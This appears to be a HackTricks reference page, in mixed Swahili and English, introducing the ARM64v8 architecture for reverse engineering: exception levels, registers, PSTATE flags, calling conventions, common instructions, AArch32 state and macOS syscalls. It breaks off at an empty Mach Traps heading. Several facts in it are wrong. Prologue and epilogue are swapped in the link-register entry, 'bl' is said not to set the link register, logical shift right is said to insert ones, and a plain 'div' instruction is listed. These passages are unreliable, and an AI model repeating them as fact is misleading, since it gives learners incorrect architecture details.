# Utangulizi wa ARM64v8

{{#include ../../../banners/hacktricks-training.md}}


## **Viwango vya Exception - EL (ARM64v8)**

Katika architecture ya ARMv8, viwango vya utekelezaji, vinavyojulikana kama Exception Levels (ELs), hufafanua kiwango cha privilege na uwezo wa mazingira ya utekelezaji. Kuna exception levels nne, kuanzia EL0 hadi EL3, na kila kimoja kina madhumuni tofauti:

1. **EL0 - User Mode**:
- Hiki ndicho kiwango chenye privilege ndogo zaidi na hutumika kutekeleza code ya kawaida ya application.
- Applications zinazoendeshwa katika EL0 zimetengwa kutoka kwa kila nyingine na kutoka kwa system software, jambo linaloongeza usalama na stability.
2. **EL1 - Operating System Kernel Mode**:
- Kernels nyingi za operating system huendeshwa katika kiwango hiki.
- EL1 ina privileges zaidi kuliko EL0 na inaweza kufikia system resources, lakini ikiwa na restrictions fulani ili kuhakikisha system integrity. Unatoka EL0 kwenda EL1 kwa kutumia instruction ya SVC.
3. **EL2 - Hypervisor Mode**:
- Kiwango hiki hutumika kwa virtualization. Hypervisor inayoendeshwa katika EL2 inaweza kusimamia operating systems nyingi (kila moja ikiwa katika EL1 yake) zinazoendesha kwenye hardware ileile ya kimwili.
- EL2 hutoa features za kutenga na kudhibiti virtualized environments.
- Kwa hiyo, virtual machine applications kama Parallels zinaweza kutumia `hypervisor.framework` kuwasiliana na EL2 na kuendesha virtual machines bila kuhitaji kernel extensions.
- Ili kuhama kutoka EL1 kwenda EL2, instruction ya `HVC` hutumika.
4. **EL3 - Secure Monitor Mode**:
- Hiki ndicho kiwango chenye privilege ya juu zaidi na mara nyingi hutumika kwa secure booting na trusted execution environments.
- EL3 inaweza kusimamia na kudhibiti accesses kati ya states za secure na non-secure (kama secure boot, trusted OS, n.k.).
- Kilitumika kwa KPP (Kernel Patch Protection) katika macOS, lakini hakitumiki tena.
- EL3 haitumiki tena na Apple.
- Transition kwenda EL3 kwa kawaida hufanywa kwa kutumia instruction ya `SMC` (Secure Monitor Call).

Matumizi ya viwango hivi huwezesha njia iliyopangwa na salama ya kusimamia vipengele tofauti vya system, kuanzia user applications hadi system software yenye privilege ya juu zaidi. Mbinu ya ARMv8 ya privilege levels husaidia kutenga kwa ufanisi system components mbalimbali, hivyo kuongeza security na robustness ya system.

## **Registers (ARM64v8)**

ARM64 ina **general-purpose registers 31**, zenye majina `x0` hadi `x30`. Kila moja inaweza kuhifadhi value ya **64-bit** (8-byte). Kwa operations zinazohitaji values za 32-bit pekee, registers hizo zinaweza kufikiwa katika mode ya 32-bit kwa kutumia majina w0 hadi w30.

1. **`x0`** hadi **`x7`** - Kwa kawaida hutumika kama scratch registers na kwa kupitisha parameters kwenye subroutines.
- **`x0`** pia hubeba return data ya function
2. **`x8`** - Katika Linux kernel, `x8` hutumika kama system call number kwa instruction ya `svc`. **Katika macOS inayotumika ni x16!**
3. **`x9`** hadi **`x15`** - Temporary registers zaidi, ambazo mara nyingi hutumika kwa local variables.
4. **`x16`** na **`x17`** - **Intra-procedural Call Registers**. Temporary registers za immediate values. Pia hutumika kwa indirect function calls na PLT (Procedure Linkage Table) stubs.
- **`x16`** hutumika kama **system call number** kwa instruction ya **`svc`** katika **macOS**.
5. **`x18`** - **Platform register**. Inaweza kutumika kama general-purpose register, lakini katika platforms fulani register hii hutengwa kwa matumizi maalum ya platform: Pointer ya current thread environment block katika Windows, au pointer ya **executing task structure katika linux kernel**.
6. **`x19`** hadi **`x28`** - Hizi ni callee-saved registers. Function lazima ihifadhi values za registers hizi kwa ajili ya caller wake, kwa hiyo huhifadhiwa kwenye stack na kurejeshwa kabla ya kurudi kwa caller.
7. **`x29`** - **Frame pointer** ya kufuatilia stack frame. Stack frame mpya inapoundwa kwa sababu function imeitwa, register ya **`x29`** **huhifadhiwa kwenye stack** na address ya **new** frame pointer (address ya **`sp`**) **huhifadhiwa katika register hii**.
- Register hii pia inaweza kutumika kama **general-purpose register**, ingawa kwa kawaida hutumika kama reference ya **local variables**.
8. **`x30`** au **`lr`**- **Link register**. Hubeba **return address** wakati instruction ya `BL` (Branch with Link) au `BLR` (Branch with Link to Register) inatekelezwa, kwa kuhifadhi value ya **`pc`** katika register hii.
- Inaweza pia kutumika kama register nyingine yoyote.
- Ikiwa function ya sasa inataka kuita function mpya na hivyo ku-overwrite `lr`, itaihifadhi kwenye stack mwanzoni; hii ni epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Hifadhi `fp` na `lr`, tengeneza nafasi na upate `fp` mpya), na kuirejesha mwishoni; hii ni prologue (`ldp x29, x30, [sp], #48; ret` -> Rejesha `fp` na `lr` na urudi).
9. **`sp`** - **Stack pointer**, hutumika kufuatilia sehemu ya juu ya stack.
- Value ya **`sp`** inapaswa daima kudumishwa ikiwa na **alignment** ya angalau **quadword**, la sivyo alignment exception inaweza kutokea.
10. **`pc`** - **Program counter**, inayoelekeza kwenye instruction inayofuata. Register hii inaweza kusasishwa kupitia exception generations, exception returns, na branches pekee. Instructions za kawaida pekee zinazoweza kusoma register hii ni branch with link instructions (BL, BLR), ambazo huhifadhi address ya **`pc`** kwenye **`lr`** (Link Register).
11. **`xzr`** - **Zero register**. Pia huitwa **`wzr`** katika mfumo wa register wa **32**-bit. Inaweza kutumika kupata value ya zero kwa urahisi (operation ya kawaida) au kufanya comparisons kwa kutumia **`subs`**, kama **`subs XZR, Xn, #10`**, huku data inayotokana isipohifadhiwa popote (**`xzr`**).

Registers za **`Wn`** ni toleo la **32-bit** la register ya **`Xn`**.

> [!TIP]
> Registers kutoka X0 - X18 ni volatile, kumaanisha kwamba values zake zinaweza kubadilishwa na function calls na interrupts. Hata hivyo, registers kutoka X19 - X28 ni non-volatile, kumaanisha kwamba values zake lazima zihifadhiwe wakati wa function calls ("callee saved").

### SIMD na Floating-Point Registers

Zaidi ya hayo, kuna registers nyingine **32 zenye urefu wa 128-bit** ambazo zinaweza kutumika katika operations zilizoboreshwa za single instruction multiple data (SIMD) na kufanya floating-point arithmetic. Hizi huitwa Vn registers, ingawa pia zinaweza kufanya kazi katika **64**-bit, **32**-bit, **16**-bit na **8**-bit; katika hali hizo huitwa **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** na **`Bn`**.

### System Registers

**Kuna mamia ya system registers**, zinazoitwa pia special-purpose registers (SPRs), ambazo hutumika **kufuatilia** na **kudhibiti** tabia ya **processors**.\
Zinaweza kusomwa au kuwekwa kwa kutumia instructions maalum **`mrs`** na **`msr`** pekee.

Special registers **`TPIDR_EL0`** na **`TPIDDR_EL0`** hupatikana mara nyingi wakati wa reverse engineering. Suffix ya `EL0` inaonyesha **exception ya chini kabisa** ambayo register inaweza kufikiwa (katika hali hii EL0 ndiyo exception (privilege) level ya kawaida ambayo regular programs huendeshea).\
Mara nyingi hutumika kuhifadhi **base address ya thread-local storage** memory region. Kwa kawaida ya kwanza inaweza kusomwa na kuandikwa na programs zinazoendesha katika EL0, lakini ya pili inaweza kusomwa kutoka EL0 na kuandikwa kutoka EL1 (kama kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** ina process components kadhaa zilizofanywa serialized katika special register **`SPSR_ELx`** inayoonekana kwa operating system, ambapo X ni **permission** **level ya exception iliyo-trigger**, (hii huwezesha kurejesha process state exception inapoisha).\
Hizi ndizo fields zinazoweza kufikiwa:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- **`N`**, **`Z`**, **`C`** na **`V`** condition flags:
- **`N`** inamaanisha operation ilitoa result hasi
- **`Z`** inamaanisha operation ilitoa zero
- **`C`** inamaanisha operation ilitoa carry
- **`V`** inamaanisha operation ilitoa signed overflow:
- Jumla ya numbers mbili chanya inatoa result hasi.
- Jumla ya numbers mbili hasi inatoa result chanya.
- Katika subtraction, wakati large negative number inapotolewa kutoka kwa smaller positive number (au kinyume chake), na result haiwezi kuwakilishwa ndani ya range ya bit size iliyotolewa.
- Ni wazi kwamba processor haijui ikiwa operation ni signed au la, kwa hiyo itaangalia C na V katika operations na kuonyesha kama carry ilitokea iwapo ilikuwa signed au unsigned.

> [!WARNING]
> Si instructions zote husasisha flags hizi. Baadhi kama **`CMP`** au **`TST`** hufanya hivyo, na nyingine zenye suffix ya s kama **`ADDS`** pia hufanya hivyo.

- **Current register width (`nRW`) flag**: Ikiwa flag ina value 0, program itaendesha katika AArch64 execution state itakaporejeshwa.
- **Current Exception Level** (**`EL`**): Regular program inayoendesha katika EL0 itakuwa na value 0
- **Single stepping** flag (**`SS`**): Hutumiwa na debuggers kufanya single step kwa kuweka SS flag kuwa 1 ndani ya **`SPSR_ELx`** kupitia exception. Program itaendesha step moja na kutoa single step exception.
- **Illegal exception** state flag (**`IL`**): Hutumika kuashiria wakati privileged software inafanya invalid exception level transfer; flag hii huwekwa kuwa 1 na processor hu-trigger illegal state exception.
- **`DAIF`** flags: Flags hizi huruhusu privileged program ku-mask kwa kuchagua external exceptions fulani.
- Ikiwa **`A`** ni 1, inamaanisha **asynchronous aborts** zita-triggeriwa. **`I`** husanidi response kwa external hardware **Interrupts Requests** (IRQs), na F inahusiana na **Fast Interrupt Requests** (FIRs).
- **Stack pointer select** flags (**`SPS`**): Privileged programs zinazoendesha katika EL1 na juu zaidi zinaweza kubadilisha kati ya kutumia register yao ya stack pointer na ile ya user-model (kwa mfano, kati ya `SP_EL1` na `EL0`). Switching hii hufanywa kwa kuandika kwenye special register ya **`SPSel`**. Hili haliwezi kufanywa kutoka EL0.

## **Calling Convention (ARM64v8)**

ARM64 calling convention inabainisha kwamba **parameters nane za kwanza** za function hupitishwa katika registers **`x0`** hadi **`x7`**. Parameters **za ziada** hupitishwa kwenye **stack**. Value ya **return** hupitishwa katika register **`x0`**, au pia katika **`x1`** **ikiwa ina urefu wa bits 128**. Registers **`x19`** hadi **`x30`** na **`sp`** lazima **zihifadhiwe** wakati wa function calls.

Unaposoma function katika assembly, tafuta **function prologue na epilogue**. **Prologue** kwa kawaida huhusisha **kuhifadhi frame pointer (`x29`)**, **kuweka** **frame pointer mpya**, na **kutenga nafasi kwenye stack**. **Epilogue** kwa kawaida huhusisha **kurejesha frame pointer iliyohifadhiwa** na **kurudi** kutoka kwenye function.

### Calling Convention katika Swift

Swift ina **calling convention** yake inayopatikana katika [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Common Instructions (ARM64v8)**

ARM64 instructions kwa kawaida zina **format `opcode dst, src1, src2`**, ambapo **`opcode`** ni **operation** inayofanywa (kama `add`, `sub`, `mov`, n.k.), **`dst`** ni register ya **destination** ambako result itahifadhiwa, na **`src1`** na **`src2`** ni registers za **source**. Immediate values pia zinaweza kutumika badala ya source registers.

- **`mov`**: **Hamisha** value kutoka **register** moja kwenda nyingine.
- Example: `mov x0, x1` — Hii huhamisha value kutoka `x1` kwenda `x0`.
- **`ldr`**: **Load** value kutoka **memory** kwenda kwenye **register**.
- Example: `ldr x0, [x1]` — Hii hu-load value kutoka memory location inayoelekezwa na `x1` kwenda `x0`.
- **Offset mode**: Offset inayoathiri origin pointer huonyeshwa, kwa mfano:
- `ldr x2, [x1, #8]`, hii ita-load kwenye x2 value kutoka x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, hii ita-load kwenye x2 object kutoka array ya x0, katika position x1 (index) \* 4
- **Pre-indexed mode**: Hii itafanya calculations kwenye origin, ipate result, na pia ihifadhi origin mpya kwenye origin.
- `ldr x2, [x1, #8]!`, hii ita-load `x1 + 8` kwenye `x2` na kuhifadhi kwenye x1 result ya `x1 + 8`
- `str lr, [sp, #-4]!`, Hifadhi link register katika sp na sasisha register sp
- **Post-index mode**: Hii ni kama ya awali, lakini memory address hufikiwa kwanza, kisha offset huhesabiwa na kuhifadhiwa.
- `ldr x0, [x1], #8`, load `x1` kwenye `x0` na sasisha x1 kwa `x1 + 8`
- **PC-relative addressing**: Katika hali hii address ya ku-load huhesabiwa relative kwa PC register
- `ldr x1, =_start`, Hii ita-load address ambako symbol ya `_start` huanza kwenye x1 relative na current PC.
- **`str`**: **Store** value kutoka **register** kwenda **memory**.
- Example: `str x0, [x1]` — Hii huhifadhi value iliyo katika `x0` kwenye memory location inayoelekezwa na `x1`.
- **`ldp`**: **Load Pair of Registers**. Instruction hii **hu-load registers mbili** kutoka **memory locations zinazofuatana**. Memory address kwa kawaida huundwa kwa kuongeza offset kwenye value iliyo katika register nyingine.
- Example: `ldp x0, x1, [x2]` — Hii hu-load `x0` na `x1` kutoka memory locations zilizo kwenye `x2` na `x2 + 8`, mtawalia.
- **`stp`**: **Store Pair of Registers**. Instruction hii **huhifadhi registers mbili** kwenye **memory locations zinazofuatana**. Memory address kwa kawaida huundwa kwa kuongeza offset kwenye value iliyo katika register nyingine.
- Example: `stp x0, x1, [sp]` — Hii huhifadhi `x0` na `x1` kwenye memory locations zilizo kwenye `sp` na `sp + 8`, mtawalia.
- `stp x0, x1, [sp, #16]!` — Hii huhifadhi `x0` na `x1` kwenye memory locations zilizo kwenye `sp+16` na `sp + 24`, mtawalia, na kusasisha `sp` kwa `sp+16`.
- **`add`**: **Add** values za registers mbili na uhifadhi result katika register.
- Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destination
- Xn2 -> Operand 1
- Xn3 | #imm -> Operando 2 (register au immediate)
- \[shift #N | RRX] -> Fanya shift au ita RRX
- Example: `add x0, x1, x2` — Hii hujumlisha values zilizo katika `x1` na `x2` na kuhifadhi result katika `x0`.
- `add x5, x5, #1, lsl #12` — Hii ni sawa na 4096 (1 iliyoshift mara 12) -> 1 0000 0000 0000 0000
- **`adds`** Hii hufanya `add` na kusasisha flags
- **`sub`**: **Subtract** values za registers mbili na uhifadhi result katika register.
- Angalia **syntax** ya **`add`**.
- Example: `sub x0, x1, x2` — Hii huondoa value iliyo katika `x2` kutoka `x1` na kuhifadhi result katika `x0`.
- **`subs`** Hii ni kama sub lakini inasasisha flag
- **`mul`**: **Multiply** values za **registers mbili** na uhifadhi result katika register.
- Example: `mul x0, x1, x2` — Hii huzidisha values zilizo katika `x1` na `x2` na kuhifadhi result katika `x0`.
- **`div`**: **Divide** value ya register moja kwa nyingine na uhifadhi result katika register.
- Example: `div x0, x1, x2` — Hii hugawanya value iliyo katika `x1` kwa `x2` na kuhifadhi result katika `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Ongeza 0s kutoka mwisho huku ukipeleka bits nyingine mbele (zidisha kwa n-times 2)
- **Logical shift right**: Ongeza 1s mwanzoni huku ukipeleka bits nyingine nyuma (gawanya kwa n-times 2 katika unsigned)
- **Arithmetic shift right**: Kama **`lsr`**, lakini badala ya kuongeza 0s ikiwa most significant bit ni 1, huongezwa **1s** (gawanya kwa n-times 2 katika signed)
- **Rotate right**: Kama **`lsr`**, lakini chochote kinachoondolewa upande wa kulia huongezwa upande wa kushoto
- **Rotate Right with Extend**: Kama **`ror`**, lakini carry flag hutumika kama "most significant bit". Kwa hiyo carry flag huhamishwa kwenda bit 31 na bit iliyoondolewa huenda kwenye carry flag.
- **`bfm`**: **Bit Field Move**, operations hizi **hunakili bits `0...n`** kutoka value moja na kuziweka katika positions **`m..m+n`**. **`#s`** hubainisha position ya **leftmost bit** na **`#r`** kiasi cha rotate right.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Nakili bitfield kutoka register moja na kuiweka kwenye register nyingine.
- **`BFI X1, X2, #3, #4`** Ingiza bits 4 kutoka X2 kuanzia bit ya 3 ya X1
- **`BFXIL X1, X2, #3, #4`** Extract bits 4 kutoka bit ya 3 ya X2 na zinakili kwenye X1
- **`SBFIZ X1, X2, #3, #4`** Sign-extend bits 4 kutoka X2 na kuziingiza katika X1 kuanzia bit position ya 3, huku ikizero bits za kulia
- **`SBFX X1, X2, #3, #4`** Extracts bits 4 zinazoanzia bit ya 3 kutoka X2, inazisign-extend, na kuweka result katika X1
- **`UBFIZ X1, X2, #3, #4`** Zero-extend bits 4 kutoka X2 na kuziingiza katika X1 kuanzia bit position ya 3, huku ikizero bits za kulia
- **`UBFX X1, X2, #3, #4`** Extracts bits 4 zinazoanzia bit ya 3 kutoka X2 na kuweka zero-extended result katika X1.
- **Sign Extend To X:** Panua sign (au ongeza 0s pekee katika unsigned version) ya value ili iweze kufanya operations nayo:
- **`SXTB X1, W2`** Panua sign ya byte **kutoka W2 kwenda X1** (`W2` ni nusu ya `X2`) ili kujaza 64bits
- **`SXTH X1, W2`** Panua sign ya number ya 16bit **kutoka W2 kwenda X1** ili kujaza 64bits
- **`SXTW X1, W2`** Panua sign ya byte **kutoka W2 kwenda X1** ili kujaza 64bits
- **`UXTB X1, W2`** Ongeza 0s (unsigned) kwenye byte **kutoka W2 kwenda X1** ili kujaza 64bits
- **`extr`:** Extracts bits kutoka **pair maalum ya registers zilizounganishwa**.
- Example: `EXTR W3, W2, W1, #3` Hii ita-**concat W1+W2** na kupata **kutoka bit ya 3 ya W2 hadi bit ya 3 ya W1**, kisha kuhifadhi katika W3.
- **`cmp`**: **Compare** registers mbili na kuweka condition flags. Ni **alias ya `subs`** inayoweka destination register kuwa zero register. Ni muhimu kujua ikiwa `m == n`.
- Inatumia **syntax ileile ya `subs`**
- Example: `cmp x0, x1` — Hii hulinganisha values zilizo katika `x0` na `x1` na kuweka condition flags ipasavyo.
- **`cmn`**: **Compare negative** operand. Katika hali hii ni **alias ya `adds`** na inatumia syntax ileile. Ni muhimu kujua ikiwa `m == -n`.
- **`ccmp`**: Conditional comparison, ni comparison itakayofanywa tu ikiwa comparison ya awali ilikuwa true na itaweka bits za nzcv maalum.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> ikiwa x1 != x2 na x3 < x4, ruka kwenda func
- Hii ni kwa sababu **`ccmp`** itatekelezwa tu ikiwa **`cmp` ya awali ilikuwa `NE`**; ikiwa haikuwa hivyo, bits za `nzcv` zitawekwa kuwa 0 (ambazo hazitatimiza comparison ya `blt`).
- Hii pia inaweza kutumika kama `ccmn` (ni ileile lakini negative, kama `cmp` dhidi ya `cmn`).
- **`tst`**: Hukagua ikiwa values za comparison zote mbili ni 1 (hufanya kazi kama ANDS bila kuhifadhi result popote). Ni muhimu kukagua register kwa value na kuona ikiwa bits zozote za register zilizoonyeshwa katika value hiyo ni 1.
- Example: `tst X1, #7` Kagua ikiwa bits 3 za mwisho za X1 zina 1 yoyote
- **`teq`**: XOR operation inayotupa result
- **`b`**: Unconditional Branch
- Example: `b myFunction`
- Kumbuka kwamba hii haitajaza link register kwa return address (haifai kwa subroutine calls zinazohitaji kurudi)
- **`bl`**: **Branch** with link, hutumika **kuita** **subroutine**. Huhifadhi **return address katika `x30`**.
- Example: `bl myFunction` — Hii huita function `myFunction` na kuhifadhi return address katika `x30`.
- Kumbuka kwamba hii haitajaza link register kwa return address (haifai kwa subroutine calls zinazohitaji kurudi)
- **`blr`**: **Branch** with Link to Register, hutumika **kuita** **subroutine** ambayo target yake **imeainishwa** katika **register**. Huhifadhi return address katika `x30`. (Hii ni
- Example: `blr x1` — Hii huita function ambayo address yake iko katika `x1` na kuhifadhi return address katika `x30`.
- **`ret`**: **Return** kutoka **subroutine**, kwa kawaida kwa kutumia address iliyo katika **`x30`**.
- Example: `ret` — Hii hurudi kutoka subroutine ya sasa kwa kutumia return address iliyo katika `x30`.
- **`b.<cond>`**: Conditional branches
- **`b.eq`**: **Branch if equal**, kulingana na instruction ya `cmp` iliyotangulia.
- Example: `b.eq label` — Ikiwa instruction ya `cmp` iliyotangulia ilipata values mbili zilizo sawa, hii huruka kwenda `label`.
- **`b.ne`**: **Branch if Not Equal**. Instruction hii hukagua condition flags (zilizowekwa na comparison instruction ya awali), na ikiwa values zilizolinganishwa hazikuwa sawa, huruka kwenda label au address.
- Example: Baada ya instruction ya `cmp x0, x1`, `b.ne label` — Ikiwa values za `x0` na `x1` hazikuwa sawa, hii huruka kwenda `label`.
- **`cbz`**: **Compare and Branch on Zero**. Instruction hii hulinganisha register na zero, na ikiwa ni sawa, huruka kwenda label au address.
- Example: `cbz x0, label` — Ikiwa value ya `x0` ni zero, hii huruka kwenda `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Instruction hii hulinganisha register na zero, na ikiwa si sawa, huruka kwenda label au address.
- Example: `cbnz x0, label` — Ikiwa value ya `x0` si zero, hii huruka kwenda `label`.
- **`tbnz`**: Test bit and branch on nonzero
- Example: `tbnz x0, #8, label`
- **`tbz`**: Test bit and branch on zero
- Example: `tbz x0, #8, label`
- **Conditional select operations**: Hizi ni operations ambazo behaviour yake hutegemea conditional bits.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Ikiwa true, X0 = X1, ikiwa false, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Ikiwa true, Xd = Xn, ikiwa false, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Ikiwa true, Xd = Xn + 1, ikiwa false, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Ikiwa true, Xd = Xn, ikiwa false, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Ikiwa true, Xd = NOT(Xn), ikiwa false, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Ikiwa true, Xd = Xn, ikiwa false, Xd = - Xm
- `cneg Xd, Xn, cond` -> Ikiwa true, Xd = - Xn, ikiwa false, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Ikiwa true, Xd = 1, ikiwa false, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Ikiwa true, Xd = \<all 1>, ikiwa false, Xd = 0
- **`adrp`**: Hesabu **page address ya symbol** na kuihifadhi katika register.
- Example: `adrp x0, symbol` — Hii huhesabu page address ya `symbol` na kuihifadhi katika `x0`.
- **`ldrsw`**: **Load** value ya signed **32-bit** kutoka memory na **sign-extend kuwa** bits **64**. Hii hutumika kwa SWITCH cases za kawaida.
- Example: `ldrsw x0, [x1]` — Hii hu-load value ya signed 32-bit kutoka memory location inayoelekezwa na `x1`, hui-sign-extend kuwa 64 bits, na kuihifadhi katika `x0`.
- **`stur`**: **Store register value kwenye memory location**, kwa kutumia offset kutoka register nyingine.
- Example: `stur x0, [x1, #4]` — Hii huhifadhi value iliyo katika `x0` kwenye memory address iliyo bytes 4 zaidi ya address iliyopo sasa katika `x1`.
- **`svc`** : Fanya **system call**. Inamaanisha "Supervisor Call". Processor inapotekeleza instruction hii, **hubadilika kutoka user mode kwenda kernel mode** na kuruka kwenye location maalum ya memory ambako code ya **kernel ya kushughulikia system call** iko.

- Example:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Hifadhi link register na frame pointer kwenye stack**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Sanidi frame pointer mpya**: `mov x29, sp` (huseti frame pointer mpya kwa ajili ya function ya sasa)
3. **Tenga nafasi kwenye stack kwa ajili ya variables za ndani** (ikiwa inahitajika): `sub sp, sp, <size>` (ambapo `<size>` ni idadi ya bytes zinazohitajika)

### **Epilogue ya Function**

1. **Ondoa variables za ndani (ikiwa zilitengwa)**: `add sp, sp, <size>`
2. **Rejesha link register na frame pointer**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (hurudisha udhibiti kwa caller kwa kutumia anwani iliyo kwenye link register)

## ARM Common Memory Protections

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## Hali ya Utekelezaji ya AARCH32

Armv8-A inaunga mkono utekelezaji wa programu za 32-bit. **AArch32** inaweza kuendesha programu katika mojawapo ya **seti mbili za instructions**: **`A32`** na **`T32`**, na inaweza kubadilika kati yao kupitia **`interworking`**.\
Programu za **Privileged** za 64-bit zinaweza kupanga **utekelezaji wa** programu za 32-bit kwa kutekeleza uhamishaji wa exception level kwenda kwenye 32-bit yenye privileged ya chini.\
Kumbuka kwamba mabadiliko kutoka 64-bit kwenda 32-bit hutokea pamoja na kushushwa kwa exception level (kwa mfano, programu ya 64-bit katika EL1 ikiendesha programu katika EL0). Hili hufanywa kwa kuweka **bit 4 ya** register maalum ya **`SPSR_ELx`** **kuwa 1** wakati thread ya process ya `AArch32` iko tayari kutekelezwa, na sehemu iliyobaki ya `SPSR_ELx` huhifadhi CPSR ya programu za **`AArch32`**. Kisha process ya privileged huita instruction ya **`ERET`**, hivyo processor hubadilika kwenda **`AArch32`** ikiingia katika A32 au T32 kulingana na CPSR**.**

**`interworking`** hufanyika kwa kutumia bits za J na T za CPSR. `J=0` na `T=0` humaanisha **`A32`**, na `J=0` na `T=1` humaanisha **T32**. Kimsingi, hii inamaanisha kuweka **biti ya chini kuwa 1** ili kuashiria kwamba seti ya instructions ni T32.\
Hii huwekwa wakati wa **instructions za branch za interworking,** lakini pia inaweza kuwekwa moja kwa moja kwa instructions nyingine wakati PC imewekwa kama register lengwa. Mfano:

Mfano mwingine:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registers

Kuna registers 16 za biti 32 (r0-r15). **Kuanzia r0 hadi r14** zinaweza kutumika kwa **operation yoyote**, hata hivyo baadhi yake kwa kawaida hutengewa matumizi maalum:

- **`r15`**: Program counter (daima). Ina address ya instruction inayofuata. Katika A32 ni current + 8, na katika T32 ni current + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer (Kumbuka kuwa stack daima ime-aligniwa kwa biti 16)
- **`r14`**: Link Register

Zaidi ya hayo, registers huhifadhiwa katika **`banked registries`**. Hizi ni sehemu zinazohifadhi values za registers na kuruhusu **fast context switching** wakati wa exception handling na privileged operations, ili kuepuka hitaji la kuhifadhi na kurejesha registers manually kila mara.\
Hii hufanywa kwa **kuhifadhi processor state kutoka `CPSR` kwenda `SPSR`** ya processor mode ambayo exception imechukuliwa. Wakati wa kurejea kutoka kwenye exception, **`CPSR`** hurejeshwa kutoka **`SPSR`**.

### CPSR - Current Program Status Register

Katika AArch32, CPSR hufanya kazi kwa njia inayofanana na **`PSTATE`** katika AArch64 na pia huhifadhiwa katika **`SPSR_ELx`** wakati exception inapochukuliwa ili kurejesha execution baadaye:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Fields zimegawanywa katika groups kadhaa:

- Application Program Status Register (APSR): Arithmetic flags zinazoweza kufikiwa kutoka EL0
- Execution State Registers: Huwakilisha tabia ya process (inasimamiwa na OS).

#### Application Program Status Register (APSR)

- Flags za **`N`**, **`Z`**, **`C`**, **`V`** (kama zilivyo katika AArch64)
- Flag ya **`Q`**: Hu-setiwa kuwa 1 wakati **integer saturation inapotokea** wakati wa execution ya specialized saturating arithmetic instruction. Mara iki-setiwa kuwa **`1`**, itaendelea kuwa na value hiyo hadi iwekwe kuwa 0 manually. Zaidi ya hayo, hakuna instruction inayokagua value yake implicitly; lazima isomwe manually.
- Flags za **`GE`** (Greater than or equal): Hutumika katika operations za SIMD (Single Instruction, Multiple Data), kama vile "parallel add" na "parallel subtract". Operations hizi huruhusu kuchakata data points nyingi katika instruction moja.

Kwa mfano, instruction ya **`UADD8`** **hu-add pairs nne za bytes** (kutoka operands mbili za biti 32) kwa parallel na kuhifadhi results katika register ya biti 32. Kisha hu-set flags za **`GE` katika `APSR`** kulingana na results hizo. Kila GE flag inalingana na moja ya byte additions, ikionyesha kama addition ya byte pair hiyo **ilifurika (overflowed)**.

Instruction ya **`SEL`** hutumia flags hizi za GE kutekeleza actions za conditional.

#### Execution State Registers

- Bits za **`J`** na **`T`**: **`J`** inapaswa kuwa 0, na ikiwa **`T`** ni 0 instruction set ya A32 hutumika; ikiwa ni 1, T32 hutumika.
- **IT Block State Register** (`ITSTATE`): Hizi ni bits za 10-15 na 25-26. Huhifadhi conditions za instructions zilizo ndani ya group yenye prefix ya **`IT`**.
- Bit ya **`E`**: Huonyesha **endianness**.
- **Mode and Exception Mask Bits** (0-4): Huamua execution state ya sasa. Ya 5 huonyesha ikiwa program ina-run kama biti 32 (1) au biti 64 (0). Nne zilizobaki huwakilisha **exception mode inayotumika kwa sasa** (exception inapotokea na kushughulikiwa). Namba iliyowekwa **huonyesha priority ya sasa** ikiwa exception nyingine itatriggeriwa wakati hii bado inashughulikiwa.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Exceptions fulani zinaweza kuzimwa kwa kutumia bits **`A`**, `I`, `F`. Ikiwa **`A`** ni 1, inamaanisha kuwa **asynchronous aborts** zitatriggeriwa. **`I`** husanidi majibu kwa **Interrupts Requests** (IRQs) za external hardware, na F inahusiana na **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Angalia [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) au endesha `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls zitakuwa na **x16 > 0**.

### Mach Traps

